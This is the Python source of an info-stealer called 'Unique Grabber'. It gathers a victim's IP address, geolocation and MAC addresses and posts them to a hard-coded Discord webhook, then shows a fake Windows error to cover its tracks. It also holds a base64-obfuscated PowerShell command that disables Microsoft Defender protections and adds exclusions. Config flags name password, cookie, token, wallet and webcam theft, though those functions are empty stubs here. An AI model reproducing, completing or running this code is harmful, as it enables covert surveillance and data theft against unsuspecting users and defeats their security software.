import requests
import base64
import subprocess
import os
from tkinter import Tk, messagebox

__CONFIG__ = {'Startup': False, 'Webcam': False, 'Passwords': False, 'Cookies': False, 'History': False, 'Tokens': False, 'Games': False, 'Wallets': False, 'WifiPassword': False, 'SystemInfo': True, 'Screenshot': False, 'CommonFiles': False, 'FakeError': True, 'DisableDefender': False}

def show_message_box(title, message):
    root = Tk()
    root.withdraw()  # Hide the main window
    messagebox.showerror(title, message)
    root.destroy()


def disable_defender():
    cmd = base64.b64decode(b'cG93ZXJzaGVsbC5leGUgU2V0LU1wUHJlZmVyZW5jZSAtRGlzYWJsZUludHJ1c2lvblByZXZlbnRpb25TeXN0ZW0gJHRydWUgLURpc2FibGVJT0FWUHJvdGVjdGlvbiAkdHJ1ZSAtRGlzYWJsZVJlYWx0aW1lTW9uaXRvcmluZyAkdHJ1ZSAtRGlzYWJsZVNjcmlwdFNjYW5uaW5nICR0cnVlIC1FbmFibGVDb250cm9sbGVkRm9sZGVyQWNjZXNzIERpc2FibGVkIC1FbmFibGVOZXR3b3JrUHJvdGVjdGlvbiBBdWRpdE1vZGUgLUZvcmNlIC1NQVBTUmVwb3J0aW5nIERpc2FibGVkIC1TdWJtaXRTYW1wbGVzQ29uc2VudCBOZXZlclNlbmQgJiYgcG93ZXJzaGVsbCBTZXQtTXBQcmVmZXJlbmNlIC1TdWJtaXRTYW1wbGVzQ29uc2VudCAyICYgcG93ZXJzaGVsbC5leGUgLWlucHV0Zm9ybWF0IG5vbmUgLW91dHB1dGZvcm1hdCBub25lIC1Ob25JbnRlcmFjdGl2ZSAtQ29tbWFuZCAiQWRkLU1wUHJlZmVyZW5jZSAtRXhjbHVzaW9uUGF0aCAlVVNFUlBST0ZJTEUlXEFwcERhdGEiICYgcG93ZXJzaGVsbC5leGUgLWlucHV0Zm9ybWF0IG5vbmUgLW91dHB1dGZvcm1hdCBub25lIC1Ob25JbnRlcmFjdGl2ZSAtQ29tbWFuZCAiQWRkLU1wUHJlZmVyZW5jZSAtRXhjbHVzaW9uUGF0aCAlVVNFUlBST0ZJTEUlXExvY2FsIiAmIHBvd2Vyc2hlbGwuZXhlIC1jb21tYW5kICJTZXQtTXBQcmVmZXJlbmNlIC1FeGNsdXNpb25FeHRlbnNpb24gJy5leGUnIiAK').decode()
    subprocess.run(cmd, shell=True, capture_output=True)

def system_info():
    url = "https://ipinfo.io/json"
    response = requests.get(url)

    if response.status_code == 200:
        data = response.json()
        IP = f"{data['ip']}"
        City = f"{data['city']}"
        Region = f"{data['region']}"
        Country = f"{data['country']}"
        Location = f"{data['loc']}"
        Organization = f"{data.get('org', 'N/A')}"
        Macs = subprocess.check_output(['getmac'], text=True, stderr=subprocess.STDOUT)
    else:
        print(f"Error: Unable to fetch data. Status code: {response.status_code}")

    webhook = "https://discord.com/api/webhooks/1201320249350430730/GMgCx5dr5MCCx3BQzC4V9DWLQ7FeoAmp5sdW8tJkje_uHvNf6Sqpfsbb1u8iy72RRbJl"
    
    payload = {
    "username": "Unique Grabber",
    "avatar_url": "https://cdn.discordapp.com/attachments/1181754597421879356/1200843975003738112/icon.png",
    "content": "@everyone @here"

    ,
    "embeds": [
        {
            "title": "Unique Grabber",
            "url": "https://discord.gg/pzKcv6NFBg",
            "color": 3447003,
            "description": f"""
__System Info__
```{Macs}```
__IP Info__
```
IP: {IP}
City: {City}
State: {Region}
Country: {Country}
Location: {Location}
Organization: {Organization}
```
""",
    "thumbnail": {
                "url": "https://cdn.discordapp.com/attachments/1181754597421879356/1200843975003738112/icon.png"
            }

        }
    ]
}

    response = requests.post(webhook, json=payload)

def Startup():
    print("")

def Webcam():
    print("")

def Passwords():
    print()






if __CONFIG__["Startup"]:
    Startup()
if __CONFIG__["Webcam"]:
    Webcam()
if __CONFIG__["Passwords"]:
    Passwords()
if __CONFIG__["SystemInfo"]:
    system_info()
if __CONFIG__["FakeError"]:
    current_directory = os.path.abspath(__file__)
    show_message_box("Windows",f"Error: Windows couldnt find {current_directory} file does not exits")

